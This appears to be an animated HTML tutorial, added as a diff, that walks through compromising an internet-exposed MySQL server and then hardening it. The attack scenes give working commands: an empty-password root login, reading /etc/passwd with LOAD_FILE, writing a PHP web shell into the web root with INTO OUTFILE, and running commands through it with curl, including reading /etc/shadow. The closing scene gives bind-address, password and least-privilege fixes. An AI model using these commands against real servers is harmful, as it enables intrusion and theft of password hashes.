@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+<title>MySQL 3306 — Root to Web Shell</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{
+  background:#0a0a0f;
+  font-family:'Press Start 2P',monospace;
+  width:100%;min-height:100vh;
+  display:flex;flex-direction:column;align-items:center;
+  color:#fff;overflow-x:hidden;
+}
+.scene{width:390px;min-height:100vh;display:none;flex-direction:column}
+.scene.active{display:flex}
+.hdr{height:90px;flex-shrink:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;padding:0 14px;border-bottom:1px solid #2a1f3d}
+.hdr-title{font-size:10px;color:#e85050;text-align:center;letter-spacing:.5px;line-height:1.7}
+.hdr-sub{font-size:9px;color:#666;text-align:center;letter-spacing:1px;line-height:1.5}
+.dots{display:flex;gap:8px}
+.dot{width:11px;height:11px;border-radius:50%;background:#2a1f3d;transition:background .2s}
+.dot.active{background:#e85050}
+.dot.done{background:#4eff9a}
+.slr{height:28px;flex-shrink:0;display:flex;align-items:center;justify-content:space-between;padding:0 14px}
+.slabel{font-size:9px;letter-spacing:1px}
+.sbadge{font-size:7px;padding:3px 8px;border:1px solid currentColor;border-radius:2px}
+.anim{flex:1;overflow-y:auto;overflow-x:hidden;scrollbar-width:none;-ms-overflow-style:none}
+.anim::-webkit-scrollbar{display:none}
+.info{height:110px;flex-shrink:0;margin:0 12px;border:2px solid #e85050;padding:10px 14px;display:flex;flex-direction:column;justify-content:center;gap:7px;font-size:9px;line-height:1.9}
+.info.gn{border-color:#4eff9a}
+.info.am{border-color:#e8a020}
+.il{color:#ccc}
+.ih{color:#4eff9a}
+.ih.rd{color:#e85050}
+.ih.am{color:#e8a020}
+.srow{height:70px;flex-shrink:0;display:flex;gap:8px;padding:8px 12px}
+.sc{flex:1;background:#130d1e;border:1px solid #2a1f3d;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px}
+.sv{font-size:10px;color:#4ec9e1;text-align:center}
+.sv.am{color:#e8a020}
+.sv.gn{color:#4eff9a}
+.sv.rd{color:#e85050}
+.sl{font-size:7px;color:#777;text-align:center;line-height:1.4}
+.ctrl{height:68px;flex-shrink:0;display:flex;align-items:center;justify-content:center;gap:10px;padding:0 12px;background:inherit}
+.btn{font-family:'Press Start 2P',monospace;font-size:9px;padding:10px 14px;border:2px solid #4ec9e1;background:transparent;color:#4ec9e1;cursor:pointer;transition:all .15s;white-space:nowrap}
+.btn:hover{background:#4ec9e130}
+.btn:active{transform:scale(.97)}
+.btn.play{border-color:#4eff9a;color:#4eff9a}
+.btn.play:hover{background:#4eff9a20}
+.btn.rd{border-color:#e85050;color:#e85050}
+.btn.rd:hover{background:#e8505020}
+.btn.am{border-color:#e8a020;color:#e8a020}
+.btn.am:hover{background:#e8a02020}
+
+/* ── terminal ── */
+.term{background:#050c0f;border:1px solid #1a2a1a;border-radius:3px;padding:8px 10px;font-size:7px;line-height:2.1;min-height:36px;position:relative}
+.t-prompt{color:#e85050}
+.t-cmd{color:#e8a020}
+.t-out{color:#4eff9a}
+.t-err{color:#e85050}
+.t-comment{color:#555}
+.t-cursor{display:inline-block;width:7px;height:12px;background:#e8a020;vertical-align:middle;animation:blink .7s step-end infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+.term-line{opacity:0;transition:opacity .25s}
+
+/* ── step rows ── */
+.step-row{display:flex;align-items:flex-start;gap:8px;padding:6px 8px;border-radius:3px;background:#130d1e;opacity:0;transition:opacity .4s;border-left:3px solid #2a1f3d}
+.step-row.ok{border-color:#4eff9a}
+.step-row.rd{border-color:#e85050}
+.step-row.am{border-color:#e8a020}
+.step-row.info{border-color:#4ec9e1}
+.step-num{font-size:7px;color:#555;flex-shrink:0;min-width:14px}
+.step-txt{font-size:7px;color:#ccc;line-height:1.9}
+
+/* ── fix line ── */
+.fix-line{font-size:7px;padding:5px 8px;background:#050c0f;border-left:3px solid #4eff9a;margin-bottom:4px;opacity:0;transition:opacity .3s;line-height:1.9;color:#aaa;border-radius:0 2px 2px 0;word-break:break-all}
+.fk{color:#4ec9e1}
+.fv{color:#4eff9a}
+.fr{color:#e8a020}
+.fe{color:#e85050}
+
+/* ── nmap result ── */
+.nmap-line{font-size:7px;padding:4px 8px;background:#050c0f;border-left:3px solid #e85050;margin-bottom:3px;opacity:0;transition:opacity .3s;line-height:1.9;color:#aaa;border-radius:0 2px 2px 0}
+
+/* ── privilege badge ── */
+.priv-badge{font-size:6px;padding:2px 6px;border-radius:2px;display:inline-block;margin-right:3px;margin-bottom:3px}
+.priv-badge.danger{background:#e8505020;border:1px solid #e8505060;color:#e85050}
+.priv-badge.ok{background:#4eff9a20;border:1px solid #4eff9a60;color:#4eff9a}
+
+/* ── compare rows ── */
+.cmp-row{display:flex;gap:5px;margin-bottom:4px;opacity:0;transition:opacity .35s}
+.cmp-kw{font-size:7px;min-width:62px;flex-shrink:0;padding:5px 6px;border-radius:2px;text-align:center}
+.cmp-cell{flex:1;font-size:6px;color:#ccc;line-height:2;padding:5px 7px;background:#130d1e;border:1px solid #1a1a2a;border-radius:2px}
+
+/* ── attack chain boxes ── */
+.chain-box{
+  display:flex;align-items:center;gap:6px;padding:7px 9px;
+  border-radius:3px;background:#130d1e;
+  opacity:0;transition:opacity .4s;border-left:3px solid #e85050;
+}
+.chain-step-num{font-size:11px;flex-shrink:0}
+.chain-txt{font-size:7px;color:#ccc;line-height:1.9;flex:1}
+.chain-badge{font-size:6px;padding:2px 5px;border-radius:2px;flex-shrink:0;white-space:nowrap}
+</style>
+</head>
+<body>
+
+<!-- ══════ SCENE 1: Discovery & Initial Access ══════ -->
+<div class="scene active" id="s1" style="background:#120808">
+  <div class="hdr" style="background:#120808">
+    <div class="hdr-title">MYSQL 3306 — ROOT TO SHELL</div>
+    <div class="hdr-sub">DB EXPOSURE & INITIAL ACCESS</div>
+    <div class="dots">
+      <div class="dot active"></div>
+      <div class="dot"></div>
+      <div class="dot"></div>
+    </div>
+  </div>
+
+  <div class="slr">
+    <span class="slabel" style="color:#e85050">STEP 1 — DISCOVERY</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">PORT 3306 OPEN</span>
+  </div>
+
+  <div class="anim" style="background:#120808">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:9px">
+
+      <div style="font-size:8px;color:#888;line-height:1.8">MySQL should bind to <span style="color:#4eff9a">127.0.0.1</span> only. If it binds to <span style="color:#e85050">0.0.0.0</span> — it's discoverable from anywhere.</div>
+
+      <!-- nmap discovery -->
+      <div style="font-size:7px;color:#555;letter-spacing:1px">ATTACKER RUNS NMAP</div>
+      <div class="term">
+        <div class="term-line" id="nm0"><span class="t-prompt">$ </span><span class="t-cmd">nmap -sV -p 3306 203.0.113.42</span></div>
+        <div class="term-line" id="nm1"><span class="t-comment"># PORT    STATE SERVICE VERSION</span></div>
+        <div class="term-line" id="nm2"><span class="t-err">3306/tcp open  mysql   MySQL 8.0.36</span></div>
+        <div class="term-line" id="nm3"><span class="t-comment"># MySQL 3306 exposed to internet — misconfiguration</span></div>
+      </div>
+
+      <!-- bind-address callout -->
+      <div style="display:flex;gap:8px">
+        <div style="flex:1;background:#e8505015;border:2px solid #e85050;border-radius:3px;padding:8px">
+          <div style="font-size:7px;color:#e85050;margin-bottom:4px">VULNERABLE</div>
+          <div style="font-size:7px;color:#aaa;line-height:2">bind-address =<br><span style="color:#e85050">0.0.0.0</span></div>
+        </div>
+        <div style="flex:1;background:#4eff9a0d;border:2px solid #4eff9a;border-radius:3px;padding:8px">
+          <div style="font-size:7px;color:#4eff9a;margin-bottom:4px">CORRECT</div>
+          <div style="font-size:7px;color:#aaa;line-height:2">bind-address =<br><span style="color:#4eff9a">127.0.0.1</span></div>
+        </div>
+      </div>
+
+      <!-- empty root password login -->
+      <div style="font-size:7px;color:#555;letter-spacing:1px">ATTEMPT EMPTY ROOT PASSWORD</div>
+      <div class="term">
+        <div class="term-line" id="rp0"><span class="t-prompt">$ </span><span class="t-cmd">mysql -h 203.0.113.42 -u root -p</span></div>
+        <div class="term-line" id="rp1"><span class="t-comment">Enter password: [ENTER — empty]</span></div>
+        <div class="term-line" id="rp2"><span class="t-out">Welcome to the MySQL monitor.</span></div>
+        <div class="term-line" id="rp3"><span class="t-err">mysql&gt; </span><span style="color:#e8a020">LOGGED IN AS ROOT — NO PASSWORD</span></div>
+      </div>
+
+      <!-- privilege check -->
+      <div style="font-size:7px;color:#555;letter-spacing:1px">CHECK DANGEROUS PRIVILEGES</div>
+      <div class="term">
+        <div class="term-line" id="pr0"><span class="t-err">mysql&gt; </span><span class="t-cmd">SHOW GRANTS FOR 'root'@'%';</span></div>
+        <div class="term-line" id="pr1"><span class="t-out">GRANT ALL PRIVILEGES ON *.* TO 'root'@'%'</span></div>
+        <div class="term-line" id="pr2"><span class="t-err">WITH GRANT OPTION</span></div>
+      </div>
+
+      <div style="opacity:0;transition:opacity .4s" id="s1_privs">
+        <div style="font-size:7px;color:#555;margin-bottom:5px">DANGEROUS PRIVILEGES ROOT HAS</div>
+        <span class="priv-badge danger">FILE</span>
+        <span class="priv-badge danger">SUPER</span>
+        <span class="priv-badge danger">PROCESS</span>
+        <span class="priv-badge danger">SHUTDOWN</span>
+        <span class="priv-badge danger">GRANT OPTION</span>
+        <span class="priv-badge danger">ALL PRIVILEGES</span>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info">
+    <div class="il">3306 on 0.0.0.0 + empty root password = full DB access from anywhere.</div>
+    <div class="ih rd">Attacker is now root in MySQL. FILE privilege is the key to OS access.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv rd">0.0.0.0</div><div class="sl">BIND ADDR<br>EXPOSED</div></div>
+    <div class="sc"><div class="sv rd">EMPTY</div><div class="sl">ROOT<br>PASSWORD</div></div>
+    <div class="sc"><div class="sv rd">FILE</div><div class="sl">PRIV<br>GRANTED</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn rd play" onclick="playS1()">▶ PLAY</button>
+    <button class="btn" onclick="nav(2)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ══════ SCENE 2: FILE Privilege → Web Shell ══════ -->
+<div class="scene" id="s2" style="background:#120808">
+  <div class="hdr" style="background:#120808">
+    <div class="hdr-title">MYSQL 3306 — ROOT TO SHELL</div>
+    <div class="hdr-sub">FILE PRIVILEGE ESCALATION</div>
+    <div class="dots">
+      <div class="dot done"></div>
+      <div class="dot active"></div>
+      <div class="dot"></div>
+    </div>
+  </div>
+
+  <div class="slr">
+    <span class="slabel" style="color:#e85050">STEP 2 — FILE READ/WRITE</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">OS ESCALATION</span>
+  </div>
+
+  <div class="anim" style="background:#120808">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:9px">
+
+      <div style="font-size:8px;color:#888;line-height:1.8">FILE privilege = read any OS file MySQL can access, write to any location MySQL can write.</div>
+
+      <!-- LOAD_FILE read -->
+      <div style="font-size:7px;color:#555;letter-spacing:1px">READ OS FILES WITH LOAD_FILE()</div>
+      <div class="term" id="s2_t1">
+        <div class="term-line" id="lf0"><span class="t-err">mysql&gt; </span><span class="t-cmd">SELECT LOAD_FILE('/etc/passwd');</span></div>
+        <div class="term-line" id="lf1"><span class="t-out">root:x:0:0:root:/root:/bin/bash</span></div>
+        <div class="term-line" id="lf2"><span class="t-out">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></div>
+        <div class="term-line" id="lf3"><span class="t-out">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span></div>
+        <div class="term-line" id="lf4"><span class="t-comment"># full /etc/passwd visible — user enumeration complete</span></div>
+      </div>
+
+      <!-- OUTFILE webshell write -->
+      <div style="font-size:7px;color:#555;letter-spacing:1px">WRITE PHP WEB SHELL WITH OUTFILE</div>
+      <div class="term" id="s2_t2">
+        <div class="term-line" id="of0"><span class="t-err">mysql&gt; </span><span class="t-cmd">SELECT '&lt;?php system($_GET["c"]); ?&gt;'</span></div>
+        <div class="term-line" id="of1"><span class="t-cmd">&nbsp;&nbsp;&nbsp;&nbsp;INTO OUTFILE '/var/www/html/shell.php';</span></div>
+        <div class="term-line" id="of2"><span class="t-out">Query OK, 1 row affected (0.00 sec)</span></div>
+        <div class="term-line" id="of3"><span class="t-err"># shell.php written to web root</span></div>
+      </div>
+
+      <!-- HTTP request to shell -->
+      <div style="font-size:7px;color:#555;letter-spacing:1px">EXECUTE OS COMMANDS VIA BROWSER</div>
+      <div class="term" id="s2_t3">
+        <div class="term-line" id="sh0"><span class="t-prompt">$ </span><span class="t-cmd">curl "http://203.0.113.42/shell.php?c=id"</span></div>
+        <div class="term-line" id="sh1"><span class="t-err">uid=33(www-data) gid=33(www-data) groups=33</span></div>
+        <div class="term-line" id="sh2"><span class="t-prompt">$ </span><span class="t-cmd">curl "http://203.0.113.42/shell.php?c=cat+/etc/shadow"</span></div>
+        <div class="term-line" id="sh3"><span class="t-err">root:$6$rounds=5000$abc...  ← password hash</span></div>
+      </div>
+
+      <!-- attack chain summary -->
+      <div style="opacity:0;transition:opacity .4s" id="s2_chain">
+        <div style="font-size:7px;color:#e85050;margin-bottom:6px;letter-spacing:1px">FULL ATTACK CHAIN</div>
+        <div style="display:flex;align-items:center;gap:4px;font-size:7px;flex-wrap:wrap">
+          <span style="color:#e8a020;padding:3px 6px;border:1px solid #e8a02040;border-radius:2px;background:#e8a02012">3306 OPEN</span>
+          <span style="color:#555">→</span>
+          <span style="color:#e85050;padding:3px 6px;border:1px solid #e8505040;border-radius:2px;background:#e8505012">ROOT LOGIN</span>
+          <span style="color:#555">→</span>
+          <span style="color:#e85050;padding:3px 6px;border:1px solid #e8505040;border-radius:2px;background:#e8505012">LOAD_FILE</span>
+          <span style="color:#555">→</span>
+          <span style="color:#e85050;padding:3px 6px;border:1px solid #e8505040;border-radius:2px;background:#e8505012">OUTFILE</span>
+          <span style="color:#555">→</span>
+          <span style="color:#e85050;padding:3px 6px;border:1px solid #e8505040;border-radius:2px;background:#e8505012">RCE</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info">
+    <div class="il">LOAD_FILE reads any file MySQL's OS user can read. OUTFILE writes anywhere it can write.</div>
+    <div class="ih rd">One SQL command writes a PHP shell to the web root. DB access = OS access.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv rd">READ</div><div class="sl">LOAD_FILE<br>/etc/passwd</div></div>
+    <div class="sc"><div class="sv rd">WRITE</div><div class="sl">OUTFILE<br>shell.php</div></div>
+    <div class="sc"><div class="sv rd">RCE</div><div class="sl">CURL<br>?c=id</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="nav(1)">◀ PREV</button>
+    <button class="btn play" onclick="playS2()">▶ PLAY</button>
+    <button class="btn" onclick="nav(3)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ══════ SCENE 3: Hardening & Fixes ══════ -->
+<div class="scene" id="s3" style="background:#081208">
+  <div class="hdr" style="background:#081208">
+    <div class="hdr-title">MYSQL 3306 — ROOT TO SHELL</div>
+    <div class="hdr-sub">HARDENING & FIXES</div>
+    <div class="dots">
+      <div class="dot done"></div>
+      <div class="dot done"></div>
+      <div class="dot active"></div>
+    </div>
+  </div>
+
+  <div class="slr">
+    <span class="slabel" style="color:#4eff9a">STEP 3 — REMEDIATION</span>
+    <span class="sbadge" style="color:#4eff9a;border-color:#4eff9a">FIX IT</span>
+  </div>
+
+  <div class="anim" style="background:#081208">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:8px">
+
+      <div style="font-size:8px;color:#888;line-height:1.8">Five changes that make this attack chain impossible.</div>
+
+      <!-- Fix 1: bind address -->
+      <div class="fix-line" id="fx0">
+        <span style="color:#555"># /etc/mysql/mysql.conf.d/mysqld.cnf</span><br>
+        <span class="fk">bind-address</span> = <span class="fv">127.0.0.1</span><br>
+        <span style="color:#555;font-size:6px"># Blocks all remote connection attempts</span>
+      </div>
+
+      <!-- Fix 2: strong root password -->
+      <div class="fix-line" id="fx1">
+        <span class="fk">ALTER USER</span> <span class="fv">'root'@'localhost'</span><br>
+        &nbsp;&nbsp;<span class="fk">IDENTIFIED BY</span> <span class="fv">'str0ng_R@ndP4ss!'</span>;<br>
+        <span class="fk">DELETE FROM</span> mysql.user <span class="fk">WHERE</span> User=<span class="fe">''</span>;<br>
+        <span style="color:#555;font-size:6px"># Remove anonymous accounts too</span>
+      </div>
+
+      <!-- Fix 3: dedicated app user, no FILE -->
+      <div class="fix-line" id="fx2">
+        <span style="color:#555"># Dedicated app account — minimum privilege</span><br>
+        <span class="fk">CREATE USER</span> <span class="fv">'appuser'@'127.0.0.1'</span> IDENTIFIED BY <span class="fv">'...'</span>;<br>
+        <span class="fk">GRANT SELECT, INSERT, UPDATE, DELETE</span><br>
+        &nbsp;&nbsp;<span class="fk">ON</span> <span class="fv">myapp.*</span> <span class="fk">TO</span> <span class="fv">'appuser'@'127.0.0.1'</span>;<br>
+        <span style="color:#555;font-size:6px"># NO FILE, NO SUPER, NO GRANT OPTION</span>
+      </div>
+
+      <!-- Fix 4: revoke FILE from root -->
+      <div class="fix-line" id="fx3" style="border-color:#e8a020">
+        <span style="color:#555"># Explicitly revoke FILE if it exists</span><br>
+        <span class="fk">REVOKE FILE ON</span> *.* <span class="fk">FROM</span> <span class="fe">'root'@'%'</span>;<br>
+        <span class="fk">DROP USER</span> <span class="fe">'root'@'%'</span>; <span style="color:#555;font-size:6px"># remote root</span>
+      </div>
+
+      <!-- Comparison table -->
+      <div id="s3_table" style="opacity:0;transition:opacity .4s;display:flex;flex-direction:column;gap:5px">
+        <div style="font-size:7px;color:#4eff9a;letter-spacing:1px">BEFORE vs AFTER</div>
+
+        <div class="cmp-row" id="cr0">
+          <div class="cmp-kw" style="background:#e8505018;border:1px solid #e8505040;color:#e85050">BIND</div>
+          <div class="cmp-cell" style="color:#e85050">0.0.0.0 — world-accessible</div>
+          <div class="cmp-cell" style="color:#4eff9a">127.0.0.1 only</div>
+        </div>
+        <div class="cmp-row" id="cr1">
+          <div class="cmp-kw" style="background:#e8505018;border:1px solid #e8505040;color:#e85050">ROOT</div>
+          <div class="cmp-cell" style="color:#e85050">empty password, remote login</div>
+          <div class="cmp-cell" style="color:#4eff9a">strong pass, localhost only</div>
+        </div>
+        <div class="cmp-row" id="cr2">
+          <div class="cmp-kw" style="background:#e8505018;border:1px solid #e8505040;color:#e85050">FILE</div>
+          <div class="cmp-cell" style="color:#e85050">granted to app user</div>
+          <div class="cmp-cell" style="color:#4eff9a">revoked, never grant to app</div>
+        </div>
+        <div class="cmp-row" id="cr3">
+          <div class="cmp-kw" style="background:#e8505018;border:1px solid #e8505040;color:#e85050">APP USER</div>
+          <div class="cmp-cell" style="color:#e85050">root used by application</div>
+          <div class="cmp-cell" style="color:#4eff9a">dedicated min-privilege account</div>
+        </div>
+
+        <div style="background:#0d1a0d;border-left:3px solid #4eff9a;padding:8px 10px;border-radius:0 3px 3px 0;opacity:0;transition:opacity .4s" id="s3_answer">
+          <div style="font-size:7px;color:#4eff9a;margin-bottom:4px">SECURITY RULE</div>
+          <div style="font-size:7px;color:#ccc;line-height:2">
+            MySQL should never be reachable from the internet. App users get SELECT/INSERT only on their schema. FILE privilege is a foot-gun — remove it from every non-root account, and keep root localhost-only.
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <div class="info gn">
+    <div class="il">bind=127.0.0.1, strong root, dedicated app user, no FILE privilege.</div>
+    <div class="ih">Four config lines that make this entire attack chain impossible.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv gn">127.0.0.1</div><div class="sl">BIND<br>ADDRESS</div></div>
+    <div class="sc"><div class="sv gn">REVOKE</div><div class="sl">FILE<br>PRIV</div></div>
+    <div class="sc"><div class="sv gn">MIN</div><div class="sl">APP USER<br>PRIVS</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="nav(2)">◀ PREV</button>
+    <button class="btn play" onclick="playS3()">▶ PLAY</button>
+    <button class="btn am" onclick="nav(1)">↩ RESTART</button>
+  </div>
+</div>
+
+<script>
+var timers=[];
+function clearAll(){timers.forEach(function(t){clearTimeout(t);clearInterval(t);});timers=[];}
+function delay(fn,ms){var t=setTimeout(fn,ms);timers.push(t);}
+function show(id){var e=document.getElementById(id);if(e)e.style.opacity='1';}
+function hide(id){var e=document.getElementById(id);if(e)e.style.opacity='0';}
+
+function nav(n){
+  clearAll();
+  document.querySelectorAll('.scene').forEach(function(s){s.classList.remove('active');});
+  document.getElementById('s'+n).classList.add('active');
+  if(n===1)playS1();
+  if(n===2)playS2();
+  if(n===3)playS3();
+}
+
+/* ─── SCENE 1 ─── */
+function playS1(){
+  clearAll();
+  ['nm0','nm1','nm2','nm3','rp0','rp1','rp2','rp3','pr0','pr1','pr2'].forEach(hide);
+  hide('s1_privs');
+
+  var nmap=['nm0','nm1','nm2','nm3'];
+  nmap.forEach(function(id,i){delay(function(){show(id);},300+i*380);});
+
+  var rp=['rp0','rp1','rp2','rp3'];
+  rp.forEach(function(id,i){delay(function(){show(id);},300+4*380+200+i*380);});
+
+  var pr=['pr0','pr1','pr2'];
+  var base=300+4*380+200+4*380+200;
+  pr.forEach(function(id,i){delay(function(){show(id);},base+i*380);});
+
+  delay(function(){show('s1_privs');},base+3*380+400);
+}
+
+/* ─── SCENE 2 ─── */
+function playS2(){
+  clearAll();
+  ['lf0','lf1','lf2','lf3','lf4',
+   'of0','of1','of2','of3',
+   'sh0','sh1','sh2','sh3'].forEach(hide);
+  hide('s2_chain');
+
+  var lf=['lf0','lf1','lf2','lf3','lf4'];
+  lf.forEach(function(id,i){delay(function(){show(id);},300+i*350);});
+
+  var ofBase=300+5*350+300;
+  var of=['of0','of1','of2','of3'];
+  of.forEach(function(id,i){delay(function(){show(id);},ofBase+i*350);});
+
+  var shBase=ofBase+4*350+300;
+  var sh=['sh0','sh1','sh2','sh3'];
+  sh.forEach(function(id,i){delay(function(){show(id);},shBase+i*400);});
+
+  delay(function(){show('s2_chain');},shBase+4*400+300);
+}
+
+/* ─── SCENE 3 ─── */
+function playS3(){
+  clearAll();
+  ['fx0','fx1','fx2','fx3'].forEach(hide);
+  hide('s3_table');
+  hide('s3_answer');
+  ['cr0','cr1','cr2','cr3'].forEach(hide);
+
+  delay(function(){show('fx0');},300);
+  delay(function(){show('fx1');},1000);
+  delay(function(){show('fx2');},1700);
+  delay(function(){show('fx3');},2400);
+  delay(function(){show('s3_table');},3100);
+  ['cr0','cr1','cr2','cr3'].forEach(function(id,i){
+    delay(function(){show(id);},3200+i*350);
+  });
+  delay(function(){show('s3_answer');},4700);
+}
+
+playS1();
+</script>
+</body>
+</html>
